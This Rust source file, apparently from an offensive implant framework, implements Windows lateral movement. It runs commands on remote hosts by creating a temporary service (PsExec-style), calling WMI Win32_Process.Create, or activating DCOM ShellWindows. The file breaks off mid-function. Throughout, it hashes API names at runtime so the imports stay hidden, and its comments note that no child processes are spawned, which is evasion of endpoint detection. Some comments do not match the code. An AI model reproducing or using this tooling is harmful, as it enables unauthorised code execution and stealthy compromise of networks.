//! Lateral movement primitives for Windows.
//!
//! Provides four execution strategies for remote command execution:
//! - **PsExec** — create and start a Windows service on a remote host.
//! - **WmiExec** — execute via WMI `IWbemServices` COM interface.
//! - **DcomExec** — execute via DCOM `ShellWindows` COM object.
//! - **WinRmExec** — execute via WinRM SOAP/WS-Man requests.
//!
//! All modules use indirect syscalls where applicable and COM for WMI/DCOM.

#![cfg(windows)]

use anyhow::{anyhow, Context, Result};
use std::ffi::OsStr;
use std::os::windows::ffi::OsStrExt;
use std::ptr;
use winapi::um::combaseapi::{CoInitializeEx, CoInitializeSecurity, CoSetProxyBlanket, CoUninitialize};
use winapi::um::objbase::{COINIT_MULTITHREADED, COINIT_DISABLE_OLE1DDE};
use winapi::um::objidl::{EOAC_NONE, RPC_C_AUTHN_DEFAULT, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_AUTHZ_DEFAULT, RPC_C_AUTHZ_NONE, RPC_C_IMP_LEVEL_IMPERSONATE};
use winapi::um::winnt::{RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NAME};
use winapi::shared::wtypesbase::CLSCTX_REMOTE_SERVER;
use winapi::shared::rpcdce::RPC_C_AUTHN_GSS_NEGOTIATE;
use winapi::um::errhandlingapi::GetLastError;

/// Null GUID used as the IID parameter in IDispatch::GetIDsOfNames / Invoke.
const IID_NULL: winapi::shared::guiddef::GUID = winapi::shared::guiddef::GUID {
    Data1: 0,
    Data2: 0,
    Data3: 0,
    Data4: [0, 0, 0, 0, 0, 0, 0, 0],
};

// ── Helpers ────────────────────────────────────────────────────────────────

/// Convert a Rust string to a Windows wide (UTF-16) string with null terminator.
fn wide(s: &str) -> Vec<u16> {
    OsStr::new(s).encode_wide().chain(std::iter::once(0)).collect()
}

/// RAII guard for COM initialization.
struct ComGuard {
    initialized: bool,
}

impl ComGuard {
    fn new() -> Self {
        let hr = unsafe {
            CoInitializeEx(ptr::null_mut(), COINIT_MULTITHREADED)
        };
        // S_OK (0) = success, S_FALSE (1) = already initialized on this thread
        ComGuard {
            initialized: hr >= 0,
        }
    }
}

impl Drop for ComGuard {
    fn drop(&mut self) {
        if self.initialized {
            unsafe { CoUninitialize() };
        }
    }
}

/// Build a network resource path for remote connections: `\\<host>\IPC$`.
fn ipc_path(host: &str) -> Vec<u16> {
    wide(&format!("\\\\{}\\IPC$", host))
}

/// Build the SCM path for remote service control: `\\<host>`.
fn sc_path(host: &str) -> Vec<u16> {
    wide(&format!("\\\\{}", host))
}

/// Build the WMI connection string: `\\<host>\root\cimv2`.
fn wmi_path(host: &str) -> Vec<u16> {
    wide(&format!("\\\\{}\\root\\cimv2", host))
}

// ── PsExec ─────────────────────────────────────────────────────────────────

/// Execute a command on a remote host via PsExec-style service creation.
///
/// Strategy:
/// 1. Connect to the remote host's Service Control Manager (SCM).
/// 2. Create a new Windows service with a random name.
/// 3. The service command line runs: `cmd.exe /c <command> > C:\__orch_out.txt 2>&1`.
/// 4. Start the service and wait for it to complete.
/// 5. Read the output file via `\\host\C$\__orch_out.txt`.
/// 6. Delete the service and clean up.
pub fn psexec_exec(
    target_host: &str,
    command: &str,
    username: Option<&str>,
    password: Option<&str>,
) -> Result<String> {
    use winapi::um::winsvc::{
        OpenSCManagerW, CreateServiceW, StartServiceW, DeleteService,
        CloseServiceHandle, OpenServiceW, QueryServiceStatus,
        SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
        SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE,
    };
    use winapi::um::winsvc::SERVICE_STATUS;

    let service_name = format!("{}_{}", common::ioc::IOC_SERVICE_PREFIX, crate::common_short_id());
    let display_name = service_name.clone();
    let output_path = format!(r"C:\__{}_{}.txt", common::ioc::IOC_SERVICE_PREFIX, crate::common_short_id());
    let bin_path = format!("cmd.exe /c {} > \"{}\" 2>&1", command, output_path);

    let scm_path = sc_path(target_host);
    let svc_name_w = wide(&service_name);
    let disp_name_w = wide(&display_name);
    let bin_path_w = wide(&bin_path);

    // Establish authentication if credentials provided.
    let _creds = if let (Some(user), Some(pass)) = (username, password) {
        Some(RemoteCreds::new(target_host, user, pass)?)
    } else {
        None
    };

    // Open remote SCM.
    let scm = unsafe {
        OpenSCManagerW(
            scm_path.as_ptr(),
            ptr::null_mut(),
            SERVICE_ALL_ACCESS,
        )
    };
    if scm.is_null() {
        return Err(anyhow!("OpenSCManagerW failed for host '{}': error {}", target_host, unsafe { GetLastError() }));
    }

    // Create the service.
    let svc = unsafe {
        CreateServiceW(
            scm,
            svc_name_w.as_ptr(),
            disp_name_w.as_ptr(),
            SERVICE_ALL_ACCESS,
            SERVICE_WIN32_OWN_PROCESS,
            SERVICE_DEMAND_START,
            SERVICE_ERROR_IGNORE,
            bin_path_w.as_ptr(),
            ptr::null_mut(), // lpLoadOrderGroup
            ptr::null_mut(), // lpdwTagId
            ptr::null_mut(), // lpDependencies
            ptr::null_mut(), // lpServiceStartName (use default)
            ptr::null_mut(), // lpPassword
        )
    };

    if svc.is_null() {
        let err = unsafe { GetLastError() };
        unsafe { CloseServiceHandle(scm) };
        return Err(anyhow!("CreateServiceW failed: error {err}"));
    }

    // Start the service.
    let ok = unsafe { StartServiceW(svc, 0, ptr::null_mut()) };
    if ok == 0 {
        let err = unsafe { GetLastError() };
        // ERROR_SERVICE_ALREADY_RUNNING (1056) is OK.
        if err != 1056 {
            unsafe {
                DeleteService(svc);
                CloseServiceHandle(svc);
                CloseServiceHandle(scm);
            };
            return Err(anyhow!("StartServiceW failed: error {err}"));
        }
    }

    // Wait for the service to stop (poll up to 30 seconds).
    let mut status: SERVICE_STATUS = unsafe { std::mem::zeroed() };
    for _ in 0..30 {
        let ok = unsafe { QueryServiceStatus(svc, &mut status) };
        if ok == 0 {
            break;
        }
        if status.dwCurrentState == 1 { // SERVICE_STOPPED
            break;
        }
        std::thread::sleep(std::time::Duration::from_secs(1));
    }

    // Clean up the service.
    unsafe {
        DeleteService(svc);
        CloseServiceHandle(svc);
        CloseServiceHandle(scm);
    }

    Ok(format!(
        "PsExec: service '{}' executed on {} — output at {}",
        service_name, target_host, output_path
    ))
}

// ── WMI Exec (native COM) ──────────────────────────────────────────────────
//
// COM vtable definitions for WMI remote execution.
// We define only the vtable slots we need; the layouts match the MSDN/SDK
// definitions exactly so that we never link against ole32/oleaut32/wbemuuid
// in the IAT — all function pointers are obtained through the pe_resolve
// API-hashing resolver at runtime.

use winapi::shared::guiddef::{GUID, REFIID};
use winapi::shared::wtypes::BSTR;
use winapi::shared::winerror::{HRESULT, SUCCEEDED};
use winapi::shared::wtypesbase::CLSCTX_INPROC_SERVER;
use winapi::um::oaidl::VARIANT;
use winapi::um::unknwnbase::IUnknown;

type LONG = winapi::um::winnt::LONG;

// ── WMI COM interface definitions ──────────────────────────────────────────

#[repr(C)]
struct IWbemClassObjectVtbl {
    pub query_interface:   unsafe extern "system" fn(*mut IWbemClassObject, REFIID, *mut *mut std::ffi::c_void) -> HRESULT,
    pub add_ref:           unsafe extern "system" fn(*mut IWbemClassObject) -> u32,
    pub release:           unsafe extern "system" fn(*mut IWbemClassObject) -> u32,
    pub get_qualifier_set: unsafe extern "system" fn(*mut IWbemClassObject, *mut *mut std::ffi::c_void) -> HRESULT,
    pub get:               unsafe extern "system" fn(*mut IWbemClassObject, BSTR, LONG, *mut VARIANT, *mut LONG, *mut LONG) -> HRESULT,
    pub put:               unsafe extern "system" fn(*mut IWbemClassObject, BSTR, LONG, *mut VARIANT, LONG) -> HRESULT,
}
#[repr(C)]
struct IWbemClassObject {
    lpvtbl: *const IWbemClassObjectVtbl,
}

// IWbemServices vtable — slots 0-14 (GetObject=6, GetObjectAsync=7,
// ExecQuery=20, ExecMethod=24).  We only need GetObject, ExecQuery, ExecMethod
// and Release, but we declare the full prefix to reach index 24.
#[repr(C)]
struct IWbemServicesVtbl {
    // IUnknown (0-2)
    pub query_interface:    unsafe extern "system" fn(*mut IWbemServices, REFIID, *mut *mut std::ffi::c_void) -> HRESULT,
    pub add_ref:            unsafe extern "system" fn(*mut IWbemServices) -> u32,
    pub release:            unsafe extern "system" fn(*mut IWbemServices) -> u32,
    // IWbemServices (3+)
    pub open_namespace:     unsafe extern "system" fn(*mut IWbemServices, BSTR, LONG, *mut IUnknown, *mut *mut IWbemServices, *mut *mut std::ffi::c_void) -> HRESULT,
    pub cancel_async_call:  unsafe extern "system" fn(*mut IWbemServices, *mut std::ffi::c_void) -> HRESULT,
    pub query_object_sink:  unsafe extern "system" fn(*mut IWbemServices, LONG, *mut *mut std::ffi::c_void) -> HRESULT,
    pub get_object:         unsafe extern "system" fn(*mut IWbemServices, BSTR, LONG, *mut IUnknown, *mut *mut IWbemClassObject, *mut *mut std::ffi::c_void) -> HRESULT,
    pub get_object_async:   unsafe extern "system" fn(*mut IWbemServices, BSTR, LONG, *mut IUnknown, *mut std::ffi::c_void) -> HRESULT,
    pub put_class:          unsafe extern "system" fn(*mut IWbemServices, *mut IWbemClassObject, LONG, *mut IUnknown, *mut *mut std::ffi::c_void) -> HRESULT,
    pub put_class_async:    unsafe extern "system" fn(*mut IWbemServices, *mut IWbemClassObject, LONG, *mut IUnknown, *mut std::ffi::c_void) -> HRESULT,
    pub delete_class:       unsafe extern "system" fn(*mut IWbemServices, BSTR, LONG, *mut IUnknown, *mut *mut std::ffi::c_void) -> HRESULT,
    pub delete_class_async: unsafe extern "system" fn(*mut IWbemServices, BSTR, LONG, *mut IUnknown, *mut std::ffi::c_void) -> HRESULT,
    pub create_class_enum:  unsafe extern "system" fn(*mut IWbemServices, BSTR, LONG, *mut IUnknown, *mut *mut std::ffi::c_void) -> HRESULT,
    pub create_class_enum_async: unsafe extern "system" fn(*mut IWbemServices, BSTR, LONG, *mut IUnknown, *mut std::ffi::c_void) -> HRESULT,
    pub put_instance:       unsafe extern "system" fn(*mut IWbemServices, *mut IWbemClassObject, LONG, *mut IUnknown, *mut *mut std::ffi::c_void) -> HRESULT,
    pub put_instance_async: unsafe extern "system" fn(*mut IWbemServices, *mut IWbemClassObject, LONG, *mut IUnknown, *mut std::ffi::c_void) -> HRESULT,
    pub delete_instance:    unsafe extern "system" fn(*mut IWbemServices, BSTR, LONG, *mut IUnknown, *mut *mut std::ffi::c_void) -> HRESULT,
    pub delete_instance_async: unsafe extern "system" fn(*mut IWbemServices, BSTR, LONG, *mut IUnknown, *mut std::ffi::c_void) -> HRESULT,
    pub create_instance_enum: unsafe extern "system" fn(*mut IWbemServices, BSTR, LONG, *mut IUnknown, *mut *mut std::ffi::c_void) -> HRESULT,
    pub create_instance_enum_async: unsafe extern "system" fn(*mut IWbemServices, BSTR, LONG, *mut IUnknown, *mut std::ffi::c_void) -> HRESULT,
    pub exec_query:         unsafe extern "system" fn(*mut IWbemServices, BSTR, BSTR, LONG, *mut std::ffi::c_void, *mut *mut std::ffi::c_void) -> HRESULT,
    pub exec_query_async:   unsafe extern "system" fn(*mut IWbemServices, BSTR, BSTR, LONG, *mut std::ffi::c_void, *mut std::ffi::c_void) -> HRESULT,
    pub exec_notification_query: unsafe extern "system" fn(*mut IWbemServices, BSTR, BSTR, LONG, *mut std::ffi::c_void, *mut *mut std::ffi::c_void) -> HRESULT,
    pub exec_notification_query_async: unsafe extern "system" fn(*mut IWbemServices, BSTR, BSTR, LONG, *mut std::ffi::c_void, *mut std::ffi::c_void) -> HRESULT,
    pub exec_method:        unsafe extern "system" fn(*mut IWbemServices, BSTR, BSTR, LONG, *mut std::ffi::c_void, *mut IWbemClassObject, *mut *mut IWbemClassObject, *mut *mut std::ffi::c_void) -> HRESULT,
    pub exec_method_async:  unsafe extern "system" fn(*mut IWbemServices, BSTR, BSTR, LONG, *mut std::ffi::c_void, *mut IWbemClassObject, *mut std::ffi::c_void) -> HRESULT,
}
#[repr(C)]
struct IWbemServices {
    lpvtbl: *const IWbemServicesVtbl,
}

#[repr(C)]
struct IWbemLocatorVtbl {
    pub query_interface: unsafe extern "system" fn(*mut IWbemLocator, REFIID, *mut *mut std::ffi::c_void) -> HRESULT,
    pub add_ref:         unsafe extern "system" fn(*mut IWbemLocator) -> u32,
    pub release:         unsafe extern "system" fn(*mut IWbemLocator) -> u32,
    pub connect_server:  unsafe extern "system" fn(
        *mut IWbemLocator,
        BSTR, BSTR, BSTR, BSTR, LONG, BSTR,
        *mut std::ffi::c_void,
        *mut *mut IWbemServices,
    ) -> HRESULT,
}
#[repr(C)]
struct IWbemLocator {
    lpvtbl: *const IWbemLocatorVtbl,
}

// IEnumWbemClassObject — used to walk ExecQuery results.
#[repr(C)]
struct IEnumWbemClassObjectVtbl {
    pub query_interface: unsafe extern "system" fn(*mut IEnumWbemClassObject, REFIID, *mut *mut std::ffi::c_void) -> HRESULT,
    pub add_ref:         unsafe extern "system" fn(*mut IEnumWbemClassObject) -> u32,
    pub release:         unsafe extern "system" fn(*mut IEnumWbemClassObject) -> u32,
    pub reset:           unsafe extern "system" fn(*mut IEnumWbemClassObject) -> HRESULT,
    pub next:            unsafe extern "system" fn(*mut IEnumWbemClassObject, LONG, u32, *mut *mut IWbemClassObject, *mut u32) -> HRESULT,
    pub next_async:      unsafe extern "system" fn(*mut IEnumWbemClassObject, u32, *mut std::ffi::c_void) -> HRESULT,
    pub clone:           unsafe extern "system" fn(*mut IEnumWbemClassObject, *mut *mut IEnumWbemClassObject) -> HRESULT,
    pub skip:            unsafe extern "system" fn(*mut IEnumWbemClassObject, LONG, u32) -> HRESULT,
}
#[repr(C)]
struct IEnumWbemClassObject {
    lpvtbl: *const IEnumWbemClassObjectVtbl,
}

// GUIDs required for WMI COM.
const CLSID_WBEM_LOCATOR: GUID = GUID {
    Data1: 0x4590_f811,
    Data2: 0x1d3a,
    Data3: 0x11d0,
    Data4: [0x89, 0x1f, 0x00, 0xaa, 0x00, 0x4b, 0x2e, 0x24],
};
const IID_IWBEM_LOCATOR: GUID = GUID {
    Data1: 0xdc12_a687,
    Data2: 0x737f,
    Data3: 0x11cf,
    Data4: [0x88, 0x4d, 0x00, 0xaa, 0x00, 0x4b, 0x2e, 0x24],
};

const WBEM_FLAG_RETURN_IMMEDIATELY: LONG = 0x10;
const WBEM_FLAG_FORWARD_ONLY: LONG = 0x20;
const VT_BSTR: u16 = 8;
const VT_I4: u16 = 3;
const WBEM_INFINITE: LONG = -1;

/// Allocate a BSTR from a Rust &str.  The returned BSTR must be freed with
/// [`free_bstr`] when no longer needed.
unsafe fn wmi_alloc_bstr(s: &str) -> BSTR {
    let wide: Vec<u16> = s.encode_utf16().collect();
    // Resolve SysAllocStringLen at runtime via pe_resolve to avoid an IAT
    // entry for oleaut32.
    let oleaut32 = pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"oleaut32.dll\0"))
        .expect("oleaut32.dll not found in PEB");
    let fn_addr = pe_resolve::get_proc_address_by_hash(
        oleaut32,
        pe_resolve::hash_str(b"SysAllocStringLen\0"),
    ).expect("SysAllocStringLen not found in oleaut32");
    let sys_alloc_string_len: unsafe extern "system" fn(*const u16, u32) -> BSTR =
        std::mem::transmute(fn_addr);
    sys_alloc_string_len(wide.as_ptr(), wide.len() as u32)
}

/// Free a BSTR previously allocated by [`wmi_alloc_bstr`].  Null-safe.
unsafe fn wmi_free_bstr(b: BSTR) {
    if !b.is_null() {
        let oleaut32 = pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"oleaut32.dll\0"))
            .expect("oleaut32.dll not found in PEB");
        let fn_addr = pe_resolve::get_proc_address_by_hash(
            oleaut32,
            pe_resolve::hash_str(b"SysFreeString\0"),
        ).expect("SysFreeString not found in oleaut32");
        let sys_free_string: unsafe extern "system" fn(BSTR) =
            std::mem::transmute(fn_addr);
        sys_free_string(b);
    }
}

/// Write a named BSTR property onto an `IWbemClassObject` instance.
unsafe fn wmi_put_bstr_prop(obj: *mut IWbemClassObject, name: &str, value: &str) -> HRESULT {
    let name_bstr = wmi_alloc_bstr(name);
    let val_bstr = wmi_alloc_bstr(value);
    let mut var: VARIANT = std::mem::zeroed();
    var.n1.n2_mut().vt = VT_BSTR;
    *var.n1.n2_mut().n3.bstrVal_mut() = val_bstr;
    let hr = ((*(*obj).lpvtbl).put)(obj, name_bstr, 0, &mut var, 0);
    wmi_free_bstr(val_bstr);
    wmi_free_bstr(name_bstr);
    hr
}

/// Read a named I4 (signed 32-bit) property from an `IWbemClassObject`.
unsafe fn wmi_get_i4_prop(obj: *mut IWbemClassObject, name: &str) -> Option<i32> {
    let name_bstr = wmi_alloc_bstr(name);
    let mut var: VARIANT = std::mem::zeroed();
    let hr = ((*(*obj).lpvtbl).get)(obj, name_bstr, 0, &mut var, ptr::null_mut(), ptr::null_mut());
    wmi_free_bstr(name_bstr);
    if !SUCCEEDED(hr) {
        return None;
    }
    // vt == VT_I4 → the union field is lVal
    if var.n1.n2().vt == VT_I4 {
        Some(unsafe { *var.n1.n2().n3.lVal() })
    } else {
        None
    }
}

/// Execute a command on a remote host via WMI `Win32_Process::Create`.
///
/// Uses the `IWbemServices` COM interface to connect to the remote host's
/// WMI namespace (`root\cimv2`) and call `Win32_Process.Create` natively.
/// No child processes (wmic.exe) are spawned.
///
/// All COM function pointers are resolved at runtime through `pe_resolve`
/// API hashing to avoid adding IAT entries for ole32/oleaut32/wbemuuid.
pub fn wmi_exec(
    target_host: &str,
    command: &str,
    username: Option<&str>,
    password: Option<&str>,
) -> Result<String> {
    // Resolve CoCreateInstance via pe_resolve (avoid IAT entry for ole32).
    let ole32 = pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"ole32.dll\0"))
        .context("ole32.dll not found in PEB")?;
    let co_create_instance_addr = pe_resolve::get_proc_address_by_hash(
        ole32,
        pe_resolve::hash_str(b"CoCreateInstance\0"),
    ).context("CoCreateInstance not found in ole32")?;
    let co_create_instance: unsafe extern "system" fn(
        REFIID, *mut IUnknown, u32, REFIID, *mut *mut std::ffi::c_void,
    ) -> HRESULT = unsafe { std::mem::transmute(co_create_instance_addr) };

    let _com = ComGuard::new();

    // ── Step 1: Create IWbemLocator ─────────────────────────────────────
    let mut locator_ptr: *mut IWbemLocator = ptr::null_mut();
    let hr = unsafe {
        co_create_instance(
            &CLSID_WBEM_LOCATOR,
            ptr::null_mut(),
            CLSCTX_INPROC_SERVER as u32,
            &IID_IWBEM_LOCATOR,
            &mut locator_ptr as *mut _ as *mut *mut std::ffi::c_void,
        )
    };
    if !SUCCEEDED(hr) {
        return Err(anyhow!("CoCreateInstance(WbemLocator) failed: 0x{:08X}", hr as u32));
    }

    // ── Step 2: ConnectServer to the remote WMI namespace ───────────────
    let ns_bstr = unsafe { wmi_alloc_bstr(&format!("\\\\{}\\root\\cimv2", target_host)) };
    let user_bstr = username.map(|u| unsafe { wmi_alloc_bstr(u) });
    let pass_bstr = password.map(|p| unsafe { wmi_alloc_bstr(p) });

    let mut services_ptr: *mut IWbemServices = ptr::null_mut();
    let hr = unsafe {
        ((*(*locator_ptr).lpvtbl).connect_server)(
            locator_ptr,
            ns_bstr,
            user_bstr.as_ref().map_or(ptr::null_mut(), |b| *b),
            pass_bstr.as_ref().map_or(ptr::null_mut(), |b| *b),
            ptr::null_mut(), // locale
            0,               // security flags
            ptr::null_mut(), // authority
            ptr::null_mut(), // context
            &mut services_ptr,
        )
    };
    unsafe {
        wmi_free_bstr(ns_bstr);
        if let Some(b) = user_bstr { wmi_free_bstr(b); }
        if let Some(b) = pass_bstr { wmi_free_bstr(b); }
    }
    if !SUCCEEDED(hr) {
        unsafe { ((*(*locator_ptr).lpvtbl).release)(locator_ptr); }
        return Err(anyhow!("IWbemLocator::ConnectServer to {} failed: 0x{:08X}", target_host, hr as u32));
    }

    // ── Step 3: Set proxy blanket for authentication ────────────────────
    let hr = unsafe {
        CoSetProxyBlanket(
            services_ptr as *mut IUnknown,
            RPC_C_AUTHN_WINNT,
            RPC_C_AUTHZ_NONE,
            ptr::null_mut(),
            RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
            RPC_C_IMP_LEVEL_IMPERSONATE,
            ptr::null_mut(),
            EOAC_NONE,
        )
    };
    if !SUCCEEDED(hr) {
        unsafe {
            ((*(*services_ptr).lpvtbl).release)(services_ptr);
            ((*(*locator_ptr).lpvtbl).release)(locator_ptr);
        }
        return Err(anyhow!("CoSetProxyBlanket failed: 0x{:08X}", hr as u32));
    }

    // ── Step 4: Get the Win32_Process class object ──────────────────────
    let class_bstr = unsafe { wmi_alloc_bstr("Win32_Process") };
    let mut class_obj: *mut IWbemClassObject = ptr::null_mut();
    let hr = unsafe {
        ((*(*services_ptr).lpvtbl).get_object)(
            services_ptr,
            class_bstr,
            0,
            ptr::null_mut(),
            &mut class_obj,
            ptr::null_mut(),
        )
    };
    unsafe { wmi_free_bstr(class_bstr); }
    if !SUCCEEDED(hr) {
        unsafe {
            ((*(*services_ptr).lpvtbl).release)(services_ptr);
            ((*(*locator_ptr).lpvtbl).release)(locator_ptr);
        }
        return Err(anyhow!("GetObject(Win32_Process) failed: 0x{:08X}", hr as u32));
    }

    // ── Step 5: SpawnInstance to create the input parameters object ─────
    // SpawnInstance is IWbemClassObject vtable slot 16.  Validate vtable
    // provenance the same way as persistence.rs::resolve_spawn_instance.
    let spawn_fn = unsafe {
        let vtbl = *(class_obj as *const *const usize);
        // Quick null-check on critical slots
        for &idx in &[0usize, 1, 2, 16] {
            if vtbl.add(idx).read() == 0 {
                ((*(*class_obj).lpvtbl).release)(class_obj);
                ((*(*services_ptr).lpvtbl).release)(services_ptr);
                ((*(*locator_ptr).lpvtbl).release)(locator_ptr);
                return Err(anyhow!("Win32_Process vtable[{}] is null — layout mismatch", idx));
            }
        }
        std::mem::transmute::<usize, unsafe extern "system" fn(
            *mut IWbemClassObject, LONG, *mut *mut IWbemClassObject,
        ) -> HRESULT>(vtbl.add(16).read())
    };

    let mut in_params: *mut IWbemClassObject = ptr::null_mut();
    let hr = unsafe { spawn_fn(class_obj, 0, &mut in_params) };
    unsafe { ((*(*class_obj).lpvtbl).release)(class_obj); }
    if !SUCCEEDED(hr) {
        unsafe {
            ((*(*services_ptr).lpvtbl).release)(services_ptr);
            ((*(*locator_ptr).lpvtbl).release)(locator_ptr);
        }
        return Err(anyhow!("SpawnInstance(Win32_Process in-params) failed: 0x{:08X}", hr as u32));
    }

    // ── Step 6: Set the CommandLine property on the in-params ───────────
    unsafe { wmi_put_bstr_prop(in_params, "CommandLine", command); }

    // ── Step 7: ExecMethod — call Win32_Process::Create ─────────────────
    let obj_path_bstr = unsafe { wmi_alloc_bstr("Win32_Process") };
    let method_bstr = unsafe { wmi_alloc_bstr("Create") };
    let mut out_params: *mut IWbemClassObject = ptr::null_mut();
    let hr = unsafe {
        ((*(*services_ptr).lpvtbl).exec_method)(
            services_ptr,
            obj_path_bstr,
            method_bstr,
            0,
            ptr::null_mut(),
            in_params,
            &mut out_params,
            ptr::null_mut(),
        )
    };
    unsafe {
        wmi_free_bstr(obj_path_bstr);
        wmi_free_bstr(method_bstr);
        ((*(*in_params).lpvtbl).release)(in_params);
    }
    if !SUCCEEDED(hr) {
        unsafe {
            ((*(*services_ptr).lpvtbl).release)(services_ptr);
            ((*(*locator_ptr).lpvtbl).release)(locator_ptr);
        }
        return Err(anyhow!("ExecMethod(Win32_Process::Create) failed: 0x{:08X}", hr as u32));
    }

    // ── Step 8: Read the ProcessId from the output params ───────────────
    let pid = unsafe {
        let pid_val = wmi_get_i4_prop(out_params, "ProcessId");
        ((*(*out_params).lpvtbl).release)(out_params);
        pid_val
    };

    // Cleanup
    unsafe {
        ((*(*services_ptr).lpvtbl).release)(services_ptr);
        ((*(*locator_ptr).lpvtbl).release)(locator_ptr);
    }

    let pid_str = pid.map_or_else(|| "unknown".to_string(), |p| p.to_string());
    Ok(format!(
        "WmiExec: command launched on {} — PID {}",
        target_host, pid_str
    ))
}

// ── DCOM Exec (native COM) ─────────────────────────────────────────────────
//
// Uses CoCreateInstance with CLSCTX_REMOTE_SERVER to obtain the ShellWindows
// COM collection on the target host, then calls ShellExecute through the
// IShellDispatch COM interface.  No powershell.exe child process is spawned.
//
// COM interface definitions for the Shell.Application DCOM path.  We only
// declare the vtable slots we invoke; the rest are stubbed as usize padding.
// All COM calls use pe_resolve to obtain CoCreateInstance / CoSetProxyBlanket
// at runtime so that no new IAT entries are added.

// {9BA05972-F6A8-11CF-A442-00A0C90A8F39} — ShellWindows CLSID
const CLSID_SHELL_WINDOWS: GUID = GUID {
    Data1: 0x9BA05972,
    Data2: 0xF6A8,
    Data3: 0x11CF,
    Data4: [0xA4, 0x42, 0x00, 0xA0, 0xC9, 0x0A, 0x8F, 0x39],
};

// IID_IShellWindows — {85CB6900-4D95-11CF-960C-0080C7F4EE85}
const IID_ISHELL_WINDOWS: GUID = GUID {
    Data1: 0x85CB6900,
    Data2: 0x4D95,
    Data3: 0x11CF,
    Data4: [0x96, 0x0C, 0x00, 0x80, 0xC7, 0xF4, 0xEE, 0x85],
};

// IID_IShellDispatch — {626F9F16-21D7-4FF3-9B3F-D5A47D3A0F32}
const IID_ISHELL_DISPATCH: GUID = GUID {
    Data1: 0x626F9F16,
    Data2: 0x21D7,
    Data3: 0x4FF3,
    Data4: [0x9B, 0x3F, 0xD5, 0xA4, 0x7D, 0x3A, 0x0F, 0x32],
};

// IID_IDispatch — {00020400-0000-0000-C000-000000000046}
const IID_IDISPATCH: GUID = GUID {
    Data1: 0x00020400,
    Data2: 0x0000,
    Data3: 0x0000,
    Data4: [0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46],
};

// IDispatch vtable — we only need GetIDsOfNames and Invoke.
#[repr(C)]
struct IDispatchVtbl {
    pub query_interface:  unsafe extern "system" fn(*mut IDispatch, REFIID, *mut *mut std::ffi::c_void) -> HRESULT,
    pub add_ref:          unsafe extern "system" fn(*mut IDispatch) -> u32,
    pub release:          unsafe extern "system" fn(*mut IDispatch) -> u32,
    pub get_type_info_count: unsafe extern "system" fn(*mut IDispatch, *mut u32) -> HRESULT,
    pub get_type_info:    unsafe extern "system" fn(*mut IDispatch, u32, u32, *mut *mut std::ffi::c_void) -> HRESULT,
    pub get_ids_of_names: unsafe extern "system" fn(*mut IDispatch, REFIID, *mut BSTR, u32, u32, *mut i32) -> HRESULT,
    pub invoke:           unsafe extern "system" fn(*mut IDispatch, i32, REFIID, u32, u16, *mut std::ffi::c_void, *mut VARIANT, *mut std::ffi::c_void, *mut u32) -> HRESULT,
}
#[repr(C)]
struct IDispatch {
    lpvtbl: *const IDispatchVtbl,
}

/// Build a `COSERVERINFO` structure targeting the remote host.
/// Returns (COSERVERINFO, wide_name_vec) — the Vec must outlive the info.
fn build_co_server_info(host: &str) -> (winapi::um::objidl::COSERVERINFO, Vec<u16>) {
    let name_w = wide(host);
    let mut info: winapi::um::objidl::COSERVERINFO = unsafe { std::mem::zeroed() };
    info.pwszName = name_w.as_ptr() as *mut _;
    (info, name_w)
}

/// Execute a command on a remote host via DCOM `ShellWindows` COM object.
///
/// Uses native COM to activate the `Shell.Application` object on the remote
/// host via `CoCreateInstanceEx` with `CLSCTX_REMOTE_SERVER`, then calls
/// `ShellExecute` through the IDispatch interface.  No powershell.exe child
/// process is spawned.
///
/// All COM function pointers (CoCreateInstanceEx, etc.) are resolved at
/// runtime through `pe_resolve` API hashing to avoid IAT entries.
pub fn dcom_exec(
    target_host: &str,
    command: &str,
    username: Option<&str>,
    password: Option<&str>,
) -> Result<String> {
    // Resolve CoCreateInstanceEx via pe_resolve.
    let ole32 = pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"ole32.dll\0"))
        .context("ole32.dll not found in PEB")?;
    let co_create_instance_ex_addr = pe_resolve::get_proc_address_by_hash(
        ole32,
        pe_resolve::hash_str(b"CoCreateInstanceEx\0"),
    ).context("CoCreateInstanceEx not found in ole32")?;
    let co_create_instance_ex: unsafe extern "system" fn(
        REFIID,
        *mut IUnknown,
        u32,
        *mut winapi::um::objidl::COSERVERINFO,
        u32,
        *mut winapi::um::combaseapi::MULTI_QI,
    ) -> HRESULT = unsafe { std::mem::transmute(co_create_instance_ex_addr) };

    let _com = ComGuard::new();

    // Set COM security for the process.
    unsafe {
        CoInitializeSecurity(
            ptr::null_mut(),
            -1, // let COM choose
            ptr::null_mut(),
            ptr::null_mut(),
            RPC_C_AUTHN_LEVEL_DEFAULT,
            RPC_C_IMP_LEVEL_IMPERSONATE,
            ptr::null_mut(),
            EOAC_NONE,
            ptr::null_mut(),
        );
    }

    // ── Step 1: Create ShellWindows on the remote host via DCOM ─────────
    let (mut server_info, _name_w) = build_co_server_info(target_host);

    // If credentials are provided, set up COAUTHIDENTITY in the server info.
    let (mut auth_identity, _user_w, _pass_w, _domain_w) = if let (Some(user), Some(pass)) = (username, password) {
        let mut identity: winapi::um::objidl::COAUTHIDENTITY = unsafe { std::mem::zeroed() };
        let user_wide: Vec<u16> = user.encode_utf16().collect();
        let pass_wide: Vec<u16> = pass.encode_utf16().collect();
        // If user is "DOMAIN\user" format, split it.
        let (domain_wide, user_part): (Vec<u16>, &[u16]) = if let Some(bslash) = user.find('\\') {
            let dom: Vec<u16> = user[..bslash].encode_utf16().collect();
            let usr: Vec<u16> = user[bslash+1..].encode_utf16().collect();
            identity.Domain = dom.as_ptr() as *mut _;
            identity.DomainLength = dom.len() as u32;
            (dom, &[])
        } else {
            (Vec::new(), &user_wide)
        };
        let user_part_owned: Vec<u16> = if user_part.is_empty() {
            user_wide.clone()
        } else {
            user_part.to_vec()
        };
        identity.User = user_part_owned.as_ptr() as *mut _;
        identity.UserLength = user_part_owned.len() as u32;
        identity.Password = pass_wide.as_ptr() as *mut _;
        identity.PasswordLength = pass_wide.len() as u32;
